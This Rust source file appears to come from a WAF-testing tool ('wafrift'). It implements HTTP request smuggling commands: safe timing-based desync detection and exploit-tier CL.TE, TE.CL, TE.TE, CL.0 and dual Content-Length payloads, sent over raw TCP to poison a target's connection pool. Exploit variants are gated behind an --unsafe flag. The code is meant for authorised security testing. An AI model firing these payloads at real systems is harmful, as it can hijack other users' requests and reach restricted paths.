//! `wafrift smuggle` — HTTP request smuggling probes (CL.TE / TE.CL /
//! TE.TE / CL.0 / H2C / chunk-extension / dual-CL / multi-value-CL).
//!
//! ## Design
//!
//! Built on top of the `wafrift-smuggling` crate, which materialises
//! every byte of the wire payload. We use a raw `tokio::net::TcpStream`
//! (NOT reqwest) because any conforming HTTP client normalises the
//! headers — and normalising the headers DEFEATS the desync. The
//! whole point of the attack is that the WAF / front-end parses the
//! payload one way and the origin parses it another, so the bytes
//! must reach the wire exactly as constructed.
//!
//! ## Subcommands
//!
//! * `wafrift smuggle list` — enumerate the variants the engine
//!   knows about, with their safety tier.
//!
//! * `wafrift smuggle dry-run --variant <V> --host <H> --smuggled-prefix <P>` —
//!   render the raw wire bytes the variant would send. No network. The
//!   single fastest way to inspect what wafrift would do, and the basis
//!   for replaying with `nc`, `curl --raw`, or any other transport.
//!
//! * `wafrift smuggle detect <HOST>` — the SAFE default. Fires only
//!   the two timing-differential detection probes (CL.TE / TE.CL
//!   with a short Content-Length that causes the back-end parser to
//!   HANG waiting for bytes that never arrive, while the front-end
//!   parser thinks the request is complete and returns immediately).
//!   Compares per-probe response latency against a baseline of N
//!   benign GETs. A delta > `--threshold-ms` is a desync signal.
//!   These probes do NOT poison the connection pool — they cause a
//!   one-shot hang that times out cleanly.
//!
//! * `wafrift smuggle probe <HOST> --variant <V>` — gated behind
//!   `--unsafe`. Fires exploit-grade payloads that DO desynchronise
//!   the connection. The next request on the poisoned socket may
//!   receive the smuggled response, which is exactly the goal, but
//!   it can also cascade into unrelated user traffic on shared
//!   connection pools. Authorisation required, banner printed.
//!
//! ## Safety
//!
//! Exploit-grade variants are gated by the `unsafe-probes` cargo
//! feature in `wafrift-smuggling`, and additionally by the runtime
//! `--unsafe` flag here. Detection-only probes are always safe to
//! run on targets you have authorisation to test.

use clap::{Args, Subcommand};
use colored::Colorize;
use std::process::ExitCode;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;
use tracing::{debug, info, warn};
use wafrift_smuggling::smuggling::{
    self, SmugglingPayload, cl_zero, detect_cl_te, detect_te_cl, dual_cl, multi_value_cl, te_cl,
    te_te,
};

#[derive(Args, Debug)]
pub struct SmuggleArgs {
    #[command(subcommand)]
    pub action: SmuggleAction,
}

#[derive(Args, Debug)]
pub struct ListArgs {
    /// Output format: `text` (default, human-readable table) or `json`
    /// (structured array of variant objects — suitable for scripting).
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,
}

#[derive(Subcommand, Debug)]
pub enum SmuggleAction {
    /// Enumerate the smuggling variants the engine ships, with
    /// their safety tier.
    List(ListArgs),

    /// Render the raw wire bytes of a smuggling payload without
    /// sending anything.
    DryRun(DryRunArgs),

    /// Detect a desync via timing differential — fires only the
    /// SAFE detection probes (CL.TE / TE.CL with a short
    /// Content-Length that hangs the back-end without poisoning
    /// the connection pool).
    Detect(DetectSmuggleArgs),

    /// Fire an exploit-grade smuggling payload. Gated by
    /// `--unsafe`. Will poison the connection pool — the next
    /// request on the socket may receive the smuggled response.
    Probe(ProbeSmuggleArgs),
}

#[derive(Args, Debug)]
pub struct DryRunArgs {
    /// Variant to render.
    #[arg(long, value_parser = parse_variant_name)]
    pub variant: VariantSelector,

    /// Host the payload claims to target (goes into the `Host:` header).
    #[arg(long)]
    pub host: String,

    /// Optional smuggled request prefix (for CL.TE / TE.CL / etc.).
    /// Use `\r\n` to embed CRLF. Defaults to a benign GET /admin so
    /// the dry-run is always meaningful.
    #[arg(long, default_value = "GET /admin HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n")]
    pub smuggled_prefix: String,

    /// Output format (`raw` or `hex`).
    #[arg(long, default_value = "raw", value_parser = ["raw", "hex"])]
    pub format: String,
}

#[derive(Args, Debug)]
pub struct DetectSmuggleArgs {
    /// Host to probe (e.g. `example.com`). Resolved via DNS.
    pub host: String,

    /// Port (default 80).
    #[arg(long, default_value_t = 80)]
    pub port: u16,

    /// Number of benign baseline GETs to time before firing the
    /// detection probes.
    #[arg(long, default_value_t = 3)]
    pub baseline_samples: u8,

    /// Connection / read timeout for a single probe.
    #[arg(long, default_value_t = 8)]
    pub timeout_secs: u64,

    /// Latency delta (probe − baseline) above which a desync is
    /// reported. Tune up for chatty networks.
    #[arg(long, default_value_t = 1500)]
    pub threshold_ms: u64,

    /// `text` (default) or `json`.
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,
}

#[derive(Args, Debug)]
pub struct ProbeSmuggleArgs {
    /// Host to probe.
    pub host: String,

    /// Variant to fire.
    #[arg(long, value_parser = parse_variant_name)]
    pub variant: VariantSelector,

    /// Port (default 80).
    #[arg(long, default_value_t = 80)]
    pub port: u16,

    /// Smuggled request prefix.
    #[arg(long, default_value = "GET /admin HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n")]
    pub smuggled_prefix: String,

    /// Required acknowledgement that you have authorisation to
    /// poison this target's connection pool. Without `--unsafe`,
    /// the probe is refused — exploit-grade payloads can affect
    /// concurrent user traffic on shared connections.
    #[arg(long)]
    pub r#unsafe: bool,

    /// Timeout per probe.
    #[arg(long, default_value_t = 8)]
    pub timeout_secs: u64,

    /// Output format.
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,
}

/// One slot in the variant catalogue — what the engine can build,
/// plus the human-readable explanation and safety tier.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SafetyTier {
    /// Times-out the back-end without poisoning the socket.
    Detection,
    /// Will desync the connection pool. Authorisation required.
    Exploit,
}

#[derive(Debug, Clone)]
pub struct VariantInfo {
    pub key: &'static str,
    pub long_name: &'static str,
    pub tier: SafetyTier,
    pub description: &'static str,
}

/// The CLI-visible variant menu. Every key here is what `--variant`
/// accepts; the safety tier gates whether `--unsafe` is required.
pub const VARIANTS: &[VariantInfo] = &[
    VariantInfo {
        key: "detect-cl-te",
        long_name: "Detect CL.TE",
        tier: SafetyTier::Detection,
        description: "Short Content-Length forces the back-end to hang waiting for chunked bytes; safe timing probe.",
    },
    VariantInfo {
        key: "detect-te-cl",
        long_name: "Detect TE.CL",
        tier: SafetyTier::Detection,
        description: "Mismatched CL+TE causes back-end hang; safe timing probe.",
    },
    VariantInfo {
        key: "cl-te",
        long_name: "Classic CL.TE",
        tier: SafetyTier::Exploit,
        description: "Front-end honours Content-Length, back-end honours Transfer-Encoding — smuggled prefix becomes a separate request on the back-end.",
    },
    VariantInfo {
        key: "te-cl",
        long_name: "Classic TE.CL",
        tier: SafetyTier::Exploit,
        description: "Reverse of CL.TE: front-end honours TE, back-end honours CL.",
    },
    VariantInfo {
        key: "te-te",
        long_name: "TE.TE obfuscation",
        tier: SafetyTier::Exploit,
        description: "Both parsers honour TE but only one accepts the obfuscated header form (whitespace / unicode / quoting); cycles through the Smuggler matrix.",
    },
    VariantInfo {
        key: "cl-0",
        long_name: "CL.0",
        tier: SafetyTier::Exploit,
        description: "Content-Length: 0 with body — back-end that ignores CL=0 reads the body as a smuggled request.",
    },
    VariantInfo {
        key: "dual-cl",
        long_name: "Dual Content-Length",
        tier: SafetyTier::Exploit,
        description: "Two Content-Length headers with different values; parsers disagree on which wins.",
    },
    VariantInfo {
        key: "multi-cl",
        long_name: "Multi-value CL",
        tier: SafetyTier::Exploit,
        description: "Content-Length: 5, 10 — comma-separated values; some parsers take the first, some the last.",
    },
];

/// Wrapper for the `--variant` arg — parses the string key to a
/// `VariantInfo` so the dispatch logic stays data-driven.
#[derive(Debug, Clone, Copy)]
pub struct VariantSelector {
    pub info: &'static VariantInfo,
}

fn parse_variant_name(s: &str) -> Result<VariantSelector, String> {
    let key = s.to_ascii_lowercase();
    for v in VARIANTS {
        if v.key == key {
            return Ok(VariantSelector { info: v });
        }
    }
    let known: Vec<_> = VARIANTS.iter().map(|v| v.key).collect();
    Err(format!(
        "unknown variant `{s}`. Known: {}",
        known.join(", ")
    ))
}

/// Render escaped `\r\n` / `\t` sequences in the user-supplied
/// smuggled prefix to actual CRLF bytes — operators paste the
/// human-readable form on the command line, we restore the wire
/// form before handing it to the engine.
#[must_use]
pub fn unescape_prefix(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.peek() {
                Some('r') => {
                    out.push('\r');
                    chars.next();
                }
                Some('n') => {
                    out.push('\n');
                    chars.next();
                }
                Some('t') => {
                    out.push('\t');
                    chars.next();
                }
                Some('\\') => {
                    out.push('\\');
                    chars.next();
                }
                _ => out.push(c),
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// Build the engine-side payload from the variant selector + args.
/// All dispatch is data-driven from the `VariantInfo::key` so adding
/// a variant is one row in `VARIANTS` plus one match arm here.
fn build_payload(
    info: &VariantInfo,
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, String> {
    match info.key {
        "detect-cl-te" => detect_cl_te(host).map_err(|e| format!("{e}")),
        "detect-te-cl" => detect_te_cl(host).map_err(|e| format!("{e}")),
        "cl-te" => smuggling::cl_te(host, smuggled_prefix).map_err(|e| format!("{e}")),
        "te-cl" => te_cl(host, smuggled_prefix).map_err(|e| format!("{e}")),
        "te-te" => te_te(host, smuggled_prefix, 1).map_err(|e| format!("{e}")),
        "cl-0" => cl_zero(host, smuggled_prefix).map_err(|e| format!("{e}")),
        "dual-cl" => dual_cl(host, smuggled_prefix, 6, 5).map_err(|e| format!("{e}")),
        "multi-cl" => multi_value_cl(host, smuggled_prefix).map_err(|e| format!("{e}")),
        other => Err(format!(
            "variant `{other}` is in the catalogue but has no builder"
        )),
    }
}

/// Result of one timing probe: how long it took the back-end to
/// respond (or hang to timeout) compared to a benign baseline.
#[derive(Debug, Clone, serde::Serialize)]
pub struct DetectFinding {
    pub variant: String,
    pub elapsed_ms: u64,
    pub baseline_ms: u64,
    pub delta_ms: i64,
    pub threshold_ms: u64,
    pub desync_inferred: bool,
}

/// Open a raw TCP connection, send the payload bytes, return how
/// long we waited for the first byte (or until timeout). Times the
/// FIRST byte specifically — that's the most diagnostic signal: a
/// healthy back-end answers immediately, a desync'd one hangs until
/// it gives up on the truncated chunked body.
async fn time_first_byte(
    host: &str,
    port: u16,
    bytes: &[u8],
    timeout_secs: u64,
) -> Result<u64, String> {
    let start = Instant::now();
    let stream_fut = TcpStream::connect((host, port));
    let mut stream = match timeout(Duration::from_secs(timeout_secs), stream_fut).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => return Err(format!("tcp connect: {e}")),
        // F126: pre-fix returned `Ok(timeout_secs * 1000)` on CONNECT
        // timeout, conflating "host unreachable" with "back-end hung
        // on the response." If the connect timed out at 8 s but the
        // benign baseline connects fast (200 ms), the delta was
        // 7800 ms — false DESYNC inferred. The READ timeout below
        // is the genuine "back-end is hanging" signal we want; the
        // CONNECT timeout means the network never got us in. Surface
        // it as Err so the caller aborts the probe and the operator
        // gets "connect timeout" instead of a phantom desync.
        Err(_) => return Err(format!("tcp connect: timed out after {timeout_secs}s")),
    };
    if let Err(e) = stream.write_all(bytes).await {
        return Err(format!("tcp write: {e}"));
    }
    if let Err(e) = stream.flush().await {
        return Err(format!("tcp flush: {e}"));
    }
    let mut buf = [0u8; 64];
    let read_fut = stream.read(&mut buf);
    match timeout(Duration::from_secs(timeout_secs), read_fut).await {
        Ok(Ok(_)) => Ok(start.elapsed().as_millis() as u64),
        Ok(Err(_)) => Ok(start.elapsed().as_millis() as u64),
        // Read timeout IS the desync signal — back-end accepted the
        // request and is hanging on the truncated chunked body. Bin
        // it at the budget for the delta calculation.
        Err(_) => Ok(timeout_secs * 1000),
    }
}

/// Median latency over N baseline GETs — the per-host "this is how
/// long an honest request takes on this network right now" anchor
/// the detection probe is compared against.
async fn measure_baseline(
    host: &str,
    port: u16,
    samples: u8,
    timeout_secs: u64,
) -> Result<u64, String> {
    if samples == 0 {
        return Ok(0);
    }
    let benign = format!("GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n");
    let mut measurements = Vec::with_capacity(samples as usize);
    for _ in 0..samples {
        let ms = time_first_byte(host, port, benign.as_bytes(), timeout_secs).await?;
        measurements.push(ms);
    }
    measurements.sort_unstable();
    Ok(measurements[measurements.len() / 2])
}

/// Classify a single timing measurement against the baseline.
/// Returns `desync_inferred = true` iff the probe took at least
/// `threshold_ms` LONGER than the baseline. Pure function — the I/O
/// already happened; this is the gate the test suite covers.
#[must_use]
pub fn classify_detection(elapsed_ms: u64, baseline_ms: u64, threshold_ms: u64) -> DetectFinding {
    let delta = elapsed_ms as i64 - baseline_ms as i64;
    DetectFinding {
        variant: String::new(),
        elapsed_ms,
        baseline_ms,
        delta_ms: delta,
        threshold_ms,
        desync_inferred: delta >= threshold_ms as i64,
    }
}

async fn run_detect(args: DetectSmuggleArgs) -> ExitCode {
    // TRACING: probe start — operator can confirm parameters at debug level.
    debug!(
        target: "wafrift::smuggle",
        host = %args.host,
        port = args.port,
        baseline_samples = args.baseline_samples,
        timeout_secs = args.timeout_secs,
        threshold_ms = args.threshold_ms,
        "smuggle detect: starting timing-differential probes"
    );
    if args.format == "text" {
        eprintln!(
            "{} {}:{}  baseline={} samples, timeout={}s, threshold={}ms",
            "── wafrift smuggle detect ──".cyan().bold(),
            args.host.bold(),
            args.port,
            args.baseline_samples,
            args.timeout_secs,
            args.threshold_ms
        );
    }
    let baseline_ms = match measure_baseline(
        &args.host,
        args.port,
        args.baseline_samples,
        args.timeout_secs,
    )
    .await
    {
        Ok(b) => b,
        Err(e) => {
            warn!(target: "wafrift::smuggle", host = %args.host, error = %e, "baseline measurement failed");
            eprintln!("{} measure baseline: {e}", "error:".red());
            return ExitCode::from(1);
        }
    };

    let mut findings = Vec::new();
    for variant_key in ["detect-cl-te", "detect-te-cl"] {
        let info = VARIANTS.iter().find(|v| v.key == variant_key).unwrap();
        let payload = match build_payload(info, &args.host, "") {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{} build {variant_key}: {e}", "error:".red());
                return ExitCode::from(1);
            }
        };
        let elapsed =
            match time_first_byte(&args.host, args.port, &payload.raw_bytes, args.timeout_secs)
                .await
            {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("{} fire {variant_key}: {e}", "error:".red());
                    return ExitCode::from(1);
                }
            };
        let mut f = classify_detection(elapsed, baseline_ms, args.threshold_ms);
        f.variant = variant_key.to_string();
        // TRACING: per-probe classification result — the key decision point.
        // At debug level the operator sees why each probe was/wasn't flagged.
        if f.desync_inferred {
            info!(
                target: "wafrift::smuggle",
                variant = %variant_key,
                elapsed_ms = f.elapsed_ms,
                baseline_ms = f.baseline_ms,
                delta_ms = f.delta_ms,
                threshold_ms = f.threshold_ms,
                "DESYNC inferred: timing delta exceeds threshold"
            );
        } else {
            debug!(
                target: "wafrift::smuggle",
                variant = %variant_key,
                elapsed_ms = f.elapsed_ms,
                delta_ms = f.delta_ms,
                "probe clean: delta below threshold"
            );
        }
        findings.push(f);
    }

    if args.format == "json" {
        let out = serde_json::json!({
            "host": args.host,
            "port": args.port,
            "baseline_ms": baseline_ms,
            "threshold_ms": args.threshold_ms,
            "findings": findings,
        });
        println!("{}", serde_json::to_string_pretty(&out).unwrap_or_default());
        return ExitCode::SUCCESS;
    }

    println!("baseline median: {baseline_ms} ms");
    let mut any = false;
    for f in &findings {
        let tag = if f.desync_inferred {
            "🚨 DESYNC".red().bold()
        } else {
            "ok".green()
        };
        println!(
            "  {}: {} elapsed={}ms delta={:+}ms threshold={}ms",
            f.variant.bold(),
            tag,
            f.elapsed_ms,
            f.delta_ms,
            f.threshold_ms
        );
        any |= f.desync_inferred;
    }
    if any {
        println!(
            "\n{}: at least one probe took >= {} ms longer than baseline. \
             Investigate with `wafrift smuggle probe --variant <V> --unsafe` \
             on AUTHORISED targets.",
            "DESYNC INFERRED".red().bold(),
            args.threshold_ms
        );
    } else {
        println!(
            "\n{}: no timing differential >= {} ms. Host parses CL/TE \
             coherently OR rate-limits unusual chunked bodies (re-test \
             with --baseline-samples 7 --threshold-ms 800 if you want \
             tighter sensitivity).",
            "no desync inferred".green(),
            args.threshold_ms
        );
    }
    ExitCode::SUCCESS
}

fn run_list(format: &str) -> ExitCode {
    if format == "json" {
        let arr: Vec<_> = VARIANTS
            .iter()
            .map(|v| {
                serde_json::json!({
                    "key": v.key,
                    "long_name": v.long_name,
                    "tier": match v.tier {
                        SafetyTier::Detection => "detection",
                        SafetyTier::Exploit => "exploit",
                    },
                    "description": v.description,
                })
            })
            .collect();
        println!("{}", serde_json::to_string_pretty(&arr).unwrap_or_default());
        return ExitCode::SUCCESS;
    }
    println!(
        "{}",
        "── wafrift smuggle: variant catalogue ──".cyan().bold()
    );
    for v in VARIANTS {
        let tag = match v.tier {
            SafetyTier::Detection => "[detection]".green(),
            SafetyTier::Exploit => "[EXPLOIT]".red().bold(),
        };
        println!(
            "  {} {} — {}\n    {}",
            tag,
            v.key.bold(),
            v.long_name,
            v.description.bright_black()
        );
    }
    println!(
        "\n{} `--variant <key>` accepts the bracketed keys. \
         Exploit-tier variants require `--unsafe`.",
        "→".bright_blue()
    );
    ExitCode::SUCCESS
}

fn run_dry(args: DryRunArgs) -> ExitCode {
    let prefix = unescape_prefix(&args.smuggled_prefix);
    let payload = match build_payload(args.variant.info, &args.host, &prefix) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("{} build payload: {e}", "error:".red());
            return ExitCode::from(1);
        }
    };
    if args.format == "hex" {
        for chunk in payload.raw_bytes.chunks(16) {
            let hex: String = chunk
                .iter()
                .map(|b| format!("{b:02x}"))
                .collect::<Vec<_>>()
                .join(" ");
            let ascii: String = chunk
                .iter()
                .map(|&b| {
                    if (0x20..0x7f).contains(&b) {
                        b as char
                    } else {
                        '.'
                    }
                })
                .collect();
            println!("{hex:<48}  {ascii}");
        }
    } else {
        match std::str::from_utf8(&payload.raw_bytes) {
            Ok(s) => print!("{s}"),
            Err(_) => {
                for b in &payload.raw_bytes {
                    print!("{}", *b as char);
                }
            }
        }
    }
    // F79: meta line routing.
    // Pre-fix this was unconditionally eprintln! regardless of
    // --format. PowerShell treats any native-cmd stderr write as
    // NativeCommandError and surfaces it even when exit code is
    // 0; bash/zsh pipelines also can't grep the canary out of
    // stdout because it lives on stderr.
    //
    // For --format raw or --format hex, the meta belongs on
    // STDOUT (in a comment-style prefix so it doesn't corrupt
    // hex/raw parsing). For --format json (if ever added), we
    // skip the meta entirely — the JSON envelope carries the
    // canary already.
    let meta = format!(
        "── meta ── variant={} canary={} bytes={}",
        args.variant.info.key,
        payload.canary.token,
        payload.raw_bytes.len()
    );
    match args.format.as_str() {
        "hex" => {
            // hex output is line-oriented; meta as a leading
            // `#` comment doesn't break hexdump-style parsers.
            println!("# {meta}");
        }
        _ => {
            // raw / text: append meta as a trailing comment line
            // on stdout so curl-pasting + scripting both work.
            println!();
            println!("# {meta}");
        }
    }
    ExitCode::SUCCESS
}

async fn run_probe(args: ProbeSmuggleArgs) -> ExitCode {
    if args.variant.info.tier == SafetyTier::Exploit && !args.r#unsafe {
        warn!(
            target: "wafrift::smuggle",
            variant = %args.variant.info.key,
            host = %args.host,
            "exploit-tier probe refused: --unsafe not set"
        );
        eprintln!(
            "{} variant `{}` is EXPLOIT-tier — it WILL desync the \
             connection pool. Re-run with `--unsafe` to acknowledge \
             you have authorisation to test this target.",
            "refused:".red().bold(),
            args.variant.info.key
        );
        return ExitCode::from(1);
    }
    let prefix = unescape_prefix(&args.smuggled_prefix);
    let payload = match build_payload(args.variant.info, &args.host, &prefix) {
        Ok(p) => p,
        Err(e) => {
            warn!(target: "wafrift::smuggle", variant = %args.variant.info.key, error = %e, "payload build failed");
            eprintln!("{} build payload: {e}", "error:".red());
            return ExitCode::from(1);
        }
    };
    // TRACING: exploit probe about to fire — canary token lets operator
    // correlate the wire send with any canary echo they observe.
    // No sensitive value in the log: variant, host, byte count, and
    // canary (a random nonce, not a credential) are all public to the operator.
    info!(
        target: "wafrift::smuggle",
        variant = %args.variant.info.key,
        host = %args.host,
        port = args.port,
        payload_bytes = payload.raw_bytes.len(),
        canary = %payload.canary.token,
        "firing exploit-tier smuggle probe"
    );
    if args.format == "text" {
        eprintln!(
            "{} variant={} host={}:{} bytes={} canary={}",
            "── wafrift smuggle probe ──".cyan().bold(),
            args.variant.info.key.bold(),
            args.host.bold(),
            args.port,
            payload.raw_bytes.len(),
            payload.canary.token
        );
    }
    let stream_fut = TcpStream::connect((args.host.as_str(), args.port));
    let mut stream = match timeout(Duration::from_secs(args.timeout_secs), stream_fut).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            eprintln!("{} tcp connect: {e}", "error:".red());
            return ExitCode::from(1);
        }
        Err(_) => {
            eprintln!("{} tcp connect: timeout", "error:".red());
            return ExitCode::from(1);
        }
    };
    if let Err(e) = stream.write_all(&payload.raw_bytes).await {
        eprintln!("{} tcp write: {e}", "error:".red());
        return ExitCode::from(1);
    }
    if let Err(e) = stream.flush().await {
        eprintln!("{} tcp flush: {e}", "error:".red());
        return ExitCode::from(1);
    }
    // Bounded read — hostile target could ship an unbounded
    // stream and OOM the scanner. Cap at 8 MiB (a real WAF block
    // response is well under 1 MiB).
    const MAX_SMUGGLE_RESPONSE_BYTES: usize = 8 * 1024 * 1024;
    let mut buf = Vec::with_capacity(4096);
    let read_fut = async {
        let mut chunk = [0u8; 8192];
        loop {
            match stream.read(&mut chunk).await {
                Ok(0) => break,
                Ok(n) => {
                    if buf.len() + n > MAX_SMUGGLE_RESPONSE_BYTES {
                        // Hostile target — stop reading.
                        break;
                    }
                    buf.extend_from_slice(&chunk[..n]);
                }
                Err(_) => break,
            }
        }
        Ok::<(), std::io::Error>(())
    };
    let elapsed = Instant::now();
    let read_result = timeout(Duration::from_secs(args.timeout_secs), read_fut).await;
    let elapsed_ms = elapsed.elapsed().as_millis() as u64;
    let bytes_read = buf.len();
    let response_preview: String = String::from_utf8_lossy(&buf[..buf.len().min(512)]).into_owned();
    // TRACING: response received — gives the operator latency and byte count
    // without requiring them to parse text output.
    debug!(
        target: "wafrift::smuggle",
        variant = %args.variant.info.key,
        elapsed_ms,
        bytes_read,
        timed_out = read_result.is_err(),
        "probe response received"
    );

    if args.format == "json" {
        let out = serde_json::json!({
            "host": args.host,
            "port": args.port,
            "variant": args.variant.info.key,
            "canary": payload.canary.token,
            "elapsed_ms": elapsed_ms,
            "bytes_read": bytes_read,
            "timed_out": read_result.is_err(),
            "response_preview": response_preview,
        });
        println!("{}", serde_json::to_string_pretty(&out).unwrap_or_default());
        return ExitCode::SUCCESS;
    }

    println!(
        "  read {} bytes in {} ms{}",
        bytes_read,
        elapsed_ms,
        if read_result.is_err() {
            " (timed out)"
        } else {
            ""
        }
    );
    if bytes_read > 0 {
        println!("  ── response preview ──");
        for line in response_preview.lines().take(10) {
            println!("  | {line}");
        }
    }
    println!(
        "\n{}: the connection pool on the front-end is now potentially \
         poisoned. The smuggled prefix will surface on the NEXT request \
         that lands on this back-end socket. Replay with `nc` or `curl` \
         to observe the smuggled response, then verify with the canary `{}`.",
        "next step".yellow().bold(),
        payload.canary.token
    );
    ExitCode::SUCCESS
}

#[allow(clippy::needless_pass_by_value)]
pub fn run_smuggle(args: SmuggleArgs) -> ExitCode {
    match args.action {
        SmuggleAction::List(a) => run_list(&a.format),
        SmuggleAction::DryRun(a) => run_dry(a),
        SmuggleAction::Detect(a) => {
            let rt = match tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
            {
                Ok(rt) => rt,
                Err(e) => {
                    eprintln!("{} tokio runtime: {e}", "error:".red());
                    return ExitCode::from(1);
                }
            };
            rt.block_on(run_detect(a))
        }
        SmuggleAction::Probe(a) => {
            let rt = match tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
            {
                Ok(rt) => rt,
                Err(e) => {
                    eprintln!("{} tokio runtime: {e}", "error:".red());
                    return ExitCode::from(1);
                }
            };
            rt.block_on(run_probe(a))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn unescape_prefix_handles_crlf_and_tab() {
        let raw = "GET /\\r\\nHost: x\\r\\n\\r\\n";
        let got = unescape_prefix(raw);
        assert_eq!(got, "GET /\r\nHost: x\r\n\r\n");
    }

    #[test]
    fn unescape_prefix_preserves_lone_backslash() {
        let raw = "C:\\Users\\foo";
        let got = unescape_prefix(raw);
        assert_eq!(got, "C:\\Users\\foo", "lone backslashes must round-trip");
    }

    #[test]
    fn unescape_prefix_handles_escaped_backslash() {
        let raw = "a\\\\b";
        let got = unescape_prefix(raw);
        assert_eq!(got, "a\\b");
    }

    #[test]
    fn classify_detection_flags_when_delta_above_threshold() {
        let f = classify_detection(2000, 200, 1500);
        assert!(f.desync_inferred);
        assert_eq!(f.delta_ms, 1800);
    }

    #[test]
    fn classify_detection_does_not_flag_when_under_threshold() {
        let f = classify_detection(800, 200, 1500);
        assert!(!f.desync_inferred);
        assert_eq!(f.delta_ms, 600);
    }

    #[test]
    fn classify_detection_does_not_flag_on_exact_zero_delta() {
        let f = classify_detection(200, 200, 1500);
        assert!(!f.desync_inferred);
        assert_eq!(f.delta_ms, 0);
    }

    #[test]
    fn classify_detection_handles_baseline_higher_than_probe() {
        // A negative delta — probe came back FASTER than baseline —
        // is never a desync signal.
        let f = classify_detection(100, 500, 1500);
        assert!(!f.desync_inferred);
        assert!(f.delta_ms < 0);
    }

    #[test]
    fn classify_detection_fires_at_exactly_threshold() {
        // Boundary — delta == threshold counts as desync.
        let f = classify_detection(1700, 200, 1500);
        assert!(f.desync_inferred);
        assert_eq!(f.delta_ms, 1500);
    }

    #[test]
    fn parse_variant_name_accepts_all_catalogue_keys() {
        for v in VARIANTS {
            let r = parse_variant_name(v.key).expect("known key must parse");
            assert_eq!(r.info.key, v.key);
        }
    }

    #[test]
    fn parse_variant_name_is_case_insensitive() {
        let r = parse_variant_name("CL-TE").expect("upper-case alias must parse");
        assert_eq!(r.info.key, "cl-te");
    }

    #[test]
    fn parse_variant_name_rejects_unknown() {
        let r = parse_variant_name("not-a-variant");
        assert!(r.is_err());
        let msg = r.unwrap_err();
        assert!(msg.contains("not-a-variant"));
        // Error message must enumerate known variants so the
        // operator knows what to type.
        assert!(msg.contains("cl-te"));
    }

    #[test]
    fn build_payload_for_every_catalogue_variant_succeeds() {
        // Anti-rig: every key in VARIANTS must have a working
        // builder. A renamed engine function or a missed match arm
        // would surface here, not on first user invocation.
        for v in VARIANTS {
            let p = build_payload(v, "example.com", "GET /admin HTTP/1.1\r\nHost: x\r\n\r\n");
            assert!(
                p.is_ok(),
                "variant `{}` failed to build: {:?}",
                v.key,
                p.err()
            );
            let bytes = p.unwrap().raw_bytes;
            assert!(!bytes.is_empty());
            assert!(
                bytes.starts_with(b"POST") || bytes.starts_with(b"GET"),
                "variant `{}` produced non-HTTP bytes",
                v.key
            );
        }
    }

    #[test]
    fn detection_variants_have_detection_tier_in_catalogue() {
        // The whole point of `--unsafe` gating: if a detection
        // variant got mis-tagged Exploit, operators would refuse
        // to run safe probes. Lock the tagging in.
        for v in VARIANTS {
            if v.key.starts_with("detect-") {
                assert_eq!(
                    v.tier,
                    SafetyTier::Detection,
                    "{} should be Detection-tier",
                    v.key
                );
            }
        }
    }

    #[test]
    fn classic_cl_te_is_exploit_tier() {
        // Sanity: a stray refactor that flipped cl-te to Detection
        // would let unauthenticated callers poison sockets.
        let cl_te = VARIANTS.iter().find(|v| v.key == "cl-te").unwrap();
        assert_eq!(cl_te.tier, SafetyTier::Exploit);
    }

    #[test]
    fn cl_te_payload_contains_both_cl_and_te_headers() {
        let p = build_payload(
            VARIANTS.iter().find(|v| v.key == "cl-te").unwrap(),
            "example.com",
            "GET /admin HTTP/1.1\r\nHost: x\r\n\r\n",
        )
        .unwrap();
        let wire = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(
            wire.contains("Content-Length"),
            "CL.TE must carry a Content-Length header"
        );
        assert!(
            wire.contains("Transfer-Encoding"),
            "CL.TE must carry a Transfer-Encoding header"
        );
    }

    #[test]
    fn detect_cl_te_payload_does_not_smuggle_a_user_prefix() {
        // Detection variants accept an empty prefix — they're
        // pure timing-probes. Confirm `build_payload("detect-cl-te", ..., "")`
        // succeeds and the output contains no caller-supplied
        // smuggled request bytes.
        let p = build_payload(
            VARIANTS.iter().find(|v| v.key == "detect-cl-te").unwrap(),
            "example.com",
            "",
        )
        .unwrap();
        let wire = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(!wire.contains("/admin"));
        assert!(!wire.contains("X-Smuggled"));
    }

    #[test]
    fn dry_run_hex_format_emits_no_io() {
        // Smoke-test that build_payload is the only work the
        // dry-run path does — no DNS, no TCP.
        let info = VARIANTS.iter().find(|v| v.key == "dual-cl").unwrap();
        let p = build_payload(info, "example.com", "GET / HTTP/1.1\r\nHost: x\r\n\r\n").unwrap();
        assert!(p.raw_bytes.len() > 50);
    }

    #[serial_test::serial]
    #[tokio::test]
    async fn time_first_byte_returns_timeout_value_when_server_silent() {
        // Spawn a TcpListener that accepts the connection and
        // does NOTHING — never writes a response. Confirms our
        // timeout path returns roughly `timeout_secs * 1000` and
        // doesn't hang the test runner. The accepted socket is
        // bound to `_sock` (not `_`) on purpose — `let _ = ...`
        // drops immediately and would close the connection,
        // making `read` return Ok(0) instantly instead of hanging.
        //
        // timeout_secs=3 rather than 1: on Windows under heavy
        // parallel test load the loopback TCP connect can take up to
        // ~1s itself (OS stack loaded by other tests). A 1s budget
        // was too narrow — the connect timeout fired before the server
        // could accept, returning Err instead of Ok(elapsed). 3s gives
        // headroom for the connect while still proving the READ timeout
        // fires before the server holds the socket open (10s).
